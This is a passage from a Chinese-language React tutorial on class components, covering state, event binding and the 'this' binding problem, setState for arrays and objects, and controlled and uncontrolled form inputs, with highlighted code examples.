class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    title: <span class="string">'数码产品'</span>,</span><br><span class="line">    list: [<span class="string">'电脑'</span>, <span class="string">'手机'</span>, <span class="string">'相机'</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;h3&gt;&#123;<span class="keyword">this</span>.state.title&#125;&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">          &#123;this.state.list.map((item) =&gt; &#123;</span></span><br><span class="line"><span class="regexp">            return &lt;li key=&#123;item&#125;&gt;&#123;item&#125;&lt;/</span>li&gt;;</span><br><span class="line">          &#125;)&#125;</span><br><span class="line">        &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>定义<strong><code>state</code></strong>属性，值是对象存储数据，<strong><code>this.state.xxx</code></strong>使用数据，数据驱动视图更新。</li></ul><h2 id="类组件-绑定事件"><a href="#类组件-绑定事件" class="headerlink" title="类组件 - 绑定事件"></a>类组件 - 绑定事件</h2><ul><li>在类中声明事件处理函数，在标签上使用<code>on+事件名称={处理函数}</code>的方式绑定事件，事件名称需要遵循<code>大驼峰</code>规则。</li><li>处理函数默认的参数就是事件对象，可以使用事件对象处理默认行为和事件冒泡。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="comment">// 默认行为</span></span><br><span class="line">    e.preventDefault();</span><br><span class="line">    <span class="comment">// 事件冒泡</span></span><br><span class="line">    e.stopPropagation();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'handleClick'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  handleMouseEnter() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'handleMouseEnter'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div onMouseEnter=&#123;<span class="keyword">this</span>.handleMouseEnter&#125;&gt;</span><br><span class="line">          计数器：&#123;<span class="keyword">this</span>.state.count&#125;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;a href="http:/</span><span class="regexp">/www.iyouhun.com" onClick=&#123;this.handleClick&#125;&gt;</span></span><br><span class="line"><span class="regexp">            按钮</span></span><br><span class="line"><span class="regexp">          &lt;/</span>a&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p> <strong>总结：</strong></p><ul><li>绑定事件的方式和原生的方式一致，使用 <code>on+事件名称={处理函数}</code> 方式绑定</li><li>事件名称使用<code>大驼峰</code>规则，例如：<code>onClick</code> <code>onMouseEnter</code> , 处理函数默认传参为事件对象。</li></ul><h3 id="事件绑定this指向"><a href="#事件绑定this指向" class="headerlink" title="事件绑定this指向"></a>事件绑定this指向</h3><ul><li>在事件处理函数中打印 <code>this.state.count</code> 发现报错，<code>this</code> 是个<code>undefined</code>。</li><li>演示函数调用对 <code>this</code> 指向的影响，得出函数谁调用 <code>this</code> 就执行谁。</li><li>找出原因：处理函数不是通过组件去调用的，导致出现 <code>this</code> 不是组件问题。</li></ul><h4 id="1-发现this是undefined"><a href="#1-发现this是undefined" class="headerlink" title="1.发现this是undefined"></a>1.发现this是undefined</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">    <span class="comment">// Uncaught TypeError: Cannot read properties of undefined (reading 'state')</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-演示处理函数调用对-this-的影响"><a href="#2-演示处理函数调用对-this-的影响" class="headerlink" title="2.演示处理函数调用对 this 的影响"></a>2.演示处理函数调用对 this 的影响</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'tom'</span>,</span><br><span class="line">  say() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">obj.say(); <span class="comment">// 打印：&#123;name: 'tom', say: function&#125;</span></span><br><span class="line"><span class="keyword">const</span> say = obj.say;</span><br><span class="line">say(); <span class="comment">// 打印：window对象  严格模式</span></span><br></pre></td></tr></table></figure><h4 id="3-问题原因"><a href="#3-问题原因" class="headerlink" title="3.问题原因"></a>3.问题原因</h4><ul><li>类组件声明的处理函数，赋值给 <code>on+事件名称</code> 属性，调用的时候不是通过组件调用的。</li></ul><h3 id="处理-this-指向问题"><a href="#处理-this-指向问题" class="headerlink" title="处理 this 指向问题"></a>处理 this 指向问题</h3><ul><li>通过绑定箭头函数解决 this 问题</li><li>通过 bind 解决 this 问题</li><li>通过声明箭头函数解决 this 问题</li></ul><h4 id="1-通过绑定箭头函数解决-this-问题"><a href="#1-通过绑定箭头函数解决-this-问题" class="headerlink" title="1.通过绑定箭头函数解决 this 问题"></a>1.通过绑定箭头函数解决 this 问题</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">+          &lt;button onClick=&#123;(e)=&gt;this.handleClick(e)&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-通过-bind-解决-this-问题"><a href="#2-通过-bind-解决-this-问题" class="headerlink" title="2.通过 bind 解决 this 问题"></a>2.通过 bind 解决 this 问题</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">  handleClick(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">+          &lt;button onClick=&#123;this.handleClick.bind(this)&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="3-通过声明箭头函数解决-this-问题-推荐"><a href="#3-通过声明箭头函数解决-this-问题-推荐" class="headerlink" title="3.通过声明箭头函数解决 this 问题(推荐)"></a>3.通过声明箭头函数解决 this 问题(推荐)</h4><p>利用箭头函数形式的class实例方法。</p><p>注意：该语法是实验性语法，但是，由于babel的存在可以直接使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 事件处理函数</span></span><br><span class="line">+  handleClick = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h2 id="类组件-setState-使用"><a href="#类组件-setState-使用" class="headerlink" title="类组件 - setState 使用"></a>类组件 - setState 使用</h2><ul><li>React 类组件提供一个函数<code>setState({需修改数据})</code>，可以更新数据和视图。</li><li>直接修改 state 中的数据是不会更新视图，演示简单数据，数组，对象的正确修改方式。</li></ul><h4 id="1-通过setState的来修改数据更新视图"><a href="#1-通过setState的来修改数据更新视图" class="headerlink" title="1.通过setState的来修改数据更新视图"></a>1.通过setState的来修改数据更新视图</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      <span class="comment">// key是要修改的数据名称，value是对应的新值</span></span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h4 id="2-修改数组和修改对象的正确姿势"><a href="#2-修改数组和修改对象的正确姿势" class="headerlink" title="2.修改数组和修改对象的正确姿势"></a>2.修改数组和修改对象的正确姿势</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">    user: &#123;</span><br><span class="line">      name: <span class="string">'jack'</span>,</span><br><span class="line">      age: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    list: [<span class="string">'电脑'</span>, <span class="string">'手机'</span>],</span><br><span class="line">  &#125;;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      <span class="comment">// key是要修改的数据名称，value是对应的新值</span></span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  updateList = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改列表</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      list: [...this.state.list, <span class="string">'相机'</span>],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  updateUser = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改对象</span></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      user: &#123;</span><br><span class="line">        ...this.state.user,</span><br><span class="line">        name: <span class="string">'tony'</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;计数器：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.handleClick&#125;&gt;按钮&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;hr /</span>&gt;</span><br><span class="line">        &lt;div&gt;商品：&#123;<span class="keyword">this</span>.state.list.join(<span class="string">','</span>)&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.updateList&#125;&gt;改数组&lt;/</span>button&gt;</span><br><span class="line">        &lt;hr /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          姓名：&#123;<span class="keyword">this</span>.state.user.name&#125;，年龄：&#123;<span class="keyword">this</span>.state.user.age&#125;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.updateUser&#125;&gt;改对象&lt;/</span>button&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><h2 id="类组件-受控组件"><a href="#类组件-受控组件" class="headerlink" title="类组件 - 受控组件"></a>类组件 - 受控组件</h2><p><strong>1.什么是受控组件</strong></p><ul><li><p>表单元素的值被 React 中<code>state</code>控制，这个表单元素就是受控组件。</p><p><strong>2.如何绑定表单元素，如：<code>input:text</code> <code>input:checkbox</code></strong></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    mobile: <span class="string">'13811112222'</span>,</span><br><span class="line">    isAgree: <span class="literal">true</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeMobile = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      mobile: e.target.value,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  changeAgree = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      isAgree: e.target.checked,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;input</span><br><span class="line">            value=&#123;<span class="keyword">this</span>.state.mobile&#125;</span><br><span class="line">            onChange=&#123;<span class="keyword">this</span>.changeMobile&#125;</span><br><span class="line">            type=<span class="string">"text"</span></span><br><span class="line">            placeholder=<span class="string">"请输入手机号"</span></span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;input</span></span><br><span class="line"><span class="regexp">            checked=&#123;this.state.isAgree&#125;</span></span><br><span class="line"><span class="regexp">            onChange=&#123;this.changeAgree&#125;</span></span><br><span class="line"><span class="regexp">            type="checkbox"</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">          同意用户协议和隐私条款</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>使用<code>state</code>的数据赋值给表单原生，通过<code>onChange</code>监听值改变修改 state 数据，完成表单元素的绑定。</li><li>这种表单元素称为受控组件。</li></ul><h2 id="类组件-非受控组件"><a href="#类组件-非受控组件" class="headerlink" title="类组件 - 非受控组件"></a>类组件 - 非受控组件</h2><p><strong>1.什么是非受控组件？</strong></p><ul><li>没有通过 state 控制的表单元素，它自己控制自身的值，就是非受控组件</li></ul><p><strong>2.通过 ref 获取表单元素获取非受控组件的值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, createRef &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 获取非受控组件的值</span></span><br><span class="line">  <span class="comment">// 1. 通过createRef创建一个ref对象</span></span><br><span class="line">  <span class="comment">// 2. 给元素绑定ref属性值为创建的ref对象</span></span><br><span class="line">  <span class="comment">// 3. 通过ref对象的current获取元素，再获取它的值</span></span><br><span class="line">  mobileRef = createRef();</span><br><span class="line"> </span><br><span class="line">  getMobile = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.mobileRef.current.value);</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  render() 